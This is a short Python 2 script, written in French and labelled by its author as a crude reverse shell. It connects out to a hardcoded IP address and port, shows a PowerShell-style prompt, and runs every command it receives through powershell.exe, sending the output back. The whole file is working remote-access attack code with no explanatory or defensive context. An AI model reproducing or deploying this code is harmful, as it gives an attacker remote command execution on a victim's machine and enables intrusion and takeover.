__HOST__ = "10.101.200.30"
__PORT__ = 6666

import socket, subprocess, os, time

os.system('cls')

ma_connexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ma_connexion.connect((__HOST__, __PORT__))

prompt = """
#################################
#                           	#
#   reverse shell tout pourri   #
#                           	#
#################################

flenalio -- 12/2018

"""
prompt += "PS " + os.getcwd()
prompt += "> "
ma_connexion.send(prompt)

while 1:
	data = ma_connexion.recv(1024)
	# print len(data) # DEBUG
	# print data + "|" # DEBUG

	ret = ""

	if len(data) > 2 :
            if data[:2] == "cd":
                data = data[:data.rfind("\n")]
                rep = data[3:]
                # DEBUG print rep
                if os.path.exists(rep):
                    os.chdir(rep)
                else:
                    ret += "cd : Impossible de trouver le chemin d'acces\n"
            elif data[:4] == "exit":
                break
            else :
                a = "powershell.exe "
                a += data
                a = a.split()
                ## Fonction quelquonque qui split un str en un tableau de str
                ## ["un", "str", "en", "un", "tableau"]
                try:
                    ret = ret + subprocess.check_output(a)
                except subprocess.CalledProcessError as e:
                    ret = ret + "[ERROR]\n" + e.output

	ret = ret + "PS " + os.getcwd() + "> "
	ma_connexion.send(ret)

ma_connexion.send("bye\n")

ma_connexion.close()


